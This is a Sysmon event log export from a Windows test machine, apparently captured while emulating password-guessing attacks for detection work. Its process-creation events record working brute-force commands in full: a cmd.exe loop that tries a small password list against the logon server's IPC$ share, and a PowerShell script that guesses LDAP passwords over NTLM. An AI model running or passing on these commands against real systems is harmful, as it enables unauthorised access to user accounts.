UtcTime: 2023-12-04 04:36:10.526
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
CreationUtcTime: 2023-12-04 04:32:15.278
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:09 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:36:09.527
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: Client Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:09 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2023-12-04 04:36:09.119
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
PipeName: \PSHost.133461381688248859.6188.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:09 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
RuleName: -
UtcTime: 2023-12-04 04:36:09.041
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
User: DESKTOP-92IIJB9\Test
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_hmazwu5l.0fz.ps1
Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
IsExecutable: false"
Information,12/3/2023 8:36:09 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:36:08.978
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_hmazwu5l.0fz.ps1
CreationUtcTime: 2023-12-04 04:36:08.978
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:36:08.947
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: IOfficeAntiVirus Module
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:08.916
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:08.900
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft Common Language Runtime Class Library
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscorlib.dll
Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:08.884
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:08.884
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscoreei.dll
Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:08.884
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\mscoree.dll
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mscoree.dll
Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2023-12-04 04:36:08.822
SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
SourceProcessId: 3600
SourceThreadId: 8604
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {1ac2ee8c-5738-656d-f602-000000001000}
TargetProcessId: 6188
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
SourceUser: DESKTOP-92IIJB9\Test
TargetUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2023-12-04 04:36:08.824
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$passwordList = Get-Content -Path \""""C:temp\T1110.001\src\passwords.txt\""""
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential(\""""$ENV:USERNAME\"""", $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account $ENV:USERNAME.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] $ENV:USERNAME:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host \""""End of bruteforce\""""}
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ParentProcessId: 3600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:08 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:36:08.822
ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ProcessId: 3600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:06 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
RuleName: -
UtcTime: 2023-12-04 04:36:04.515
ProcessGuid: {1ac2ee8c-5734-656d-f502-000000001000}
ProcessId: 1948
QueryName: desktop-92iijb9
QueryStatus: 0
QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
Image: C:\Windows\System32\net.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:04 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2023-12-04 04:36:04.467
ProcessGuid: {1ac2ee8c-5734-656d-f502-000000001000}
ProcessId: 1948
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""ChangeMe! ""  
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
ParentProcessId: 5704
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:02 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
RuleName: -
UtcTime: 2023-12-04 04:36:00.395
ProcessGuid: {1ac2ee8c-5730-656d-f402-000000001000}
ProcessId: 4376
QueryName: desktop-92iijb9
QueryStatus: 0
QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
Image: C:\Windows\System32\net.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:00 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2023-12-04 04:36:00.360
ProcessGuid: {1ac2ee8c-5730-656d-f402-000000001000}
ProcessId: 4376
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""Spring2022 ""  
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
ParentProcessId: 5704
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:58 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
RuleName: -
UtcTime: 2023-12-04 04:35:56.249
ProcessGuid: {1ac2ee8c-572c-656d-f302-000000001000}
ProcessId: 8644
QueryName: desktop-92iijb9
QueryStatus: 0
QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
Image: C:\Windows\System32\net.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:56 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2023-12-04 04:35:56.216
ProcessGuid: {1ac2ee8c-572c-656d-f302-000000001000}
ProcessId: 8644
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""Password! ""  
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
ParentProcessId: 5704
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:54 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
RuleName: -
UtcTime: 2023-12-04 04:35:52.104
ProcessGuid: {1ac2ee8c-5728-656d-f202-000000001000}
ProcessId: 5188
QueryName: desktop-92iijb9
QueryStatus: 0
QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
Image: C:\Windows\System32\net.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:52 PM,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
RuleName: technique_id=T1099,technique_name=Timestomp
UtcTime: 2023-12-04 04:35:52.462
ProcessGuid: {1ac2ee8c-542b-656d-1a01-000000001000}
ProcessId: 244
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MsMpEng.exe
TargetFilename: C:temp\bin\BrowserCollector.exe
CreationUtcTime: 2023-12-04 04:27:49.338
PreviousCreationUtcTime: 2023-12-04 04:27:49.338
User: NT AUTHORITY\SYSTEM"
Information,12/3/2023 8:35:52 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2023-12-04 04:35:52.070
ProcessGuid: {1ac2ee8c-5728-656d-f202-000000001000}
ProcessId: 5188
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""1q2w3e4r ""  
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
ParentProcessId: 5704
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:48 PM,Microsoft-Windows-Sysmon,22,Dns query (rule: DnsQuery),"Dns query:
RuleName: -
UtcTime: 2023-12-04 04:35:47.960
ProcessGuid: {1ac2ee8c-5723-656d-f102-000000001000}
ProcessId: 2024
QueryName: desktop-92iijb9
QueryStatus: 0
QueryResults: fe80::825:854d:5705:2fde;::ffff:192.168.114.196;
Image: C:\Windows\System32\net.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:47 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2023-12-04 04:35:47.901
ProcessGuid: {1ac2ee8c-5723-656d-f102-000000001000}
ProcessId: 2024
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  use \\DESKTOP-92IIJB9\IPC$ /user:""DESKTOP-92IIJB9\Test"" ""Password1 ""  
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {1ac2ee8c-5723-656d-ef02-000000001000}
ParentProcessId: 5704
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
ParentUser: DESKTOP-92IIJB9\Test"
